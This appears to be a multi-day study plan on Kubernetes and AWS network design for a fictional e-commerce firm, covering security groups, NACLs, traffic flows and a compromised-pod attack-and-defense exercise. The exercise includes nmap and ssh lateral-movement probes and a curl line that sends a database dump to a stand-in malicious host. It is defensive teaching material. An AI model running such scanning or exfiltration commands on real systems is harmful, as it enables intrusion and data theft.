## Day 1-2: Network Architecture Design

### Scenario

```
Company: "ShopEase" — E-commerce platform
Platform: Kubernetes (EKS) on AWS
Requirements:
  - Production + Staging environments (isolated)
  - 3-tier microservices: Frontend → API → Database
  - External: Website + Mobile App + Admin Dashboard
  - 3rd-party integrations: Payment gateway, Email service
  - Security: PCI-DSS compliance (payment data isolation)
```

## Day 3: Security Design

### Security Group Matrix

```
┌─────────────────────┬──────────┬──────────┬──────────┬──────────┐
│ Traffic Flow        │ Port     │ Source   │ Protocol │ Purpose  │
├─────────────────────┼──────────┼──────────┼──────────┼──────────┤
│ Internet → ALB      │ 443      │ 0.0.0.0/0│ TCP      │ User     │
│ ALB → Frontend Pods │ 3000     │ sg-alb   │ TCP      │ Web      │
│ Frontend → API Pods │ 8080     │ sg-fe    │ TCP      │ API call │
│ API → Database      │ 5432     │ sg-api   │ TCP      │ Queries  │
│ API → Payment Svc   │ 8443     │ sg-api   │ mTLS     │ PCI-DSS  │
│ VPN → Bastion       │ 22       │ Office   │ TCP      │ Admin    │
│ Bastion → Nodes     │ 22       │ sg-bast  │ TCP      │ SSH      │
│ Nodes → Internet    │ ALL      │ 0.0.0.0/0│ ALL      │ Images   │
│ Control Plane → Kubelet│ 10250 │ sg-cp    │ TCP      │ K8s      │
└─────────────────────┴──────────┴──────────┴──────────┴──────────┘
```

### NACL Design

```
Public Subnet NACL:
  Inbound:  ALLOW 443 from 0.0.0.0/0, DENY ALL
  Outbound: ALLOW 1024-65535 to 0.0.0.0/0, ALLOW 443 to VPC CIDR

Private-DB Subnet NACL:
  Inbound:  ALLOW 5432 from 10.0.16.0/20, DENY ALL
  Outbound: ALLOW 1024-65535 to 10.0.16.0/20, DENY ALL
  (Database ONLY talks back to app servers — no internet at all!)
```

## Day 4: Traffic Flow Analysis

### Flow 1: User Request to Web Page

```
1. User → DNS → ALB DNS name → ALB Public IPs
2. User → ALB (HTTPS:443, TLS termination at ALB)
3. ALB → Target Group → Frontend Pod (10.0.16.x, port 3000)
4. Frontend Pod → CoreDNS → api-service.ns.svc.cluster.local → API ClusterIP
5. kube-proxy → iptables DNAT → API Pod (10.0.17.x, port 8080)
6. API Pod → PostgreSQL RDS (10.0.48.x, port 5432)
7. Response flows back through same chain

Hops: 6
Components touched: ALB, Node, kube-proxy, Pod, RDS
Security boundaries: Public SG → App SG → DB SG
```

### Flow 2: Pod Pulling Image

```
1. kubelet → CRI → "need nginx:latest"
2. CRI → ECR/ Docker Hub (public endpoint)
3. Pod IP (100.64.x.x) → Node IP (via iptables MASQUERADE)
4. Node IP (10.0.16.x) → NAT GW → IGW → Internet → Registry
5. Image downloaded → stored locally

Security: Pod has no direct internet → Node NAT required
```

## Day 5: Attack & Defense Scenario

### Attack Scenario: Compromised Frontend Pod

```
Attacker gains shell in frontend pod.

Step 1: Enumeration
  $ ip addr → Pod IP: 100.64.1.5
  $ curl http://api-service.default.svc.cluster.local:8080/admin
    → Allowed! (API service allows frontend → API traffic)

Step 2: Lateral Movement Attempt
  $ nmap -sT 10.0.48.0/24 -p 5432
    → Security Group BLOCKED (only sg-api allowed, not sg-fe)
  $ curl http://payment-service.pci.svc.cluster.local:8443
    → NetworkPolicy DENIED (no label match)
  $ ssh 10.0.16.10 (worker node)
    → Security Group BLOCKED

Step 3: Data Exfiltration Attempt
  $ curl http://malicious-server.com/exfil -d @database_dump
    → NAT GW allows outbound! (Need egress NetworkPolicy/Firewall)

Defense Layers Worked:
  ✓ Service-to-service NetworkPolicy
  ✓ Database Security Group (app-tier only)
  ✓ mTLS between services (Istio)
  ✗ Outbound egress not restricted → Room for improvement

Fix: Add egress NetworkPolicy, VPC Flow Logs monitoring,
     Suricata/Zeek on node for outbound anomaly detection
```

```
│     → All API server requests                                │

│                                                              │
│  5. Prometheus Metrics                                       │
│     → Node Exporter: node network stats                      │
│     → kube-state-metrics: service/pod/endpoint counts        │
```
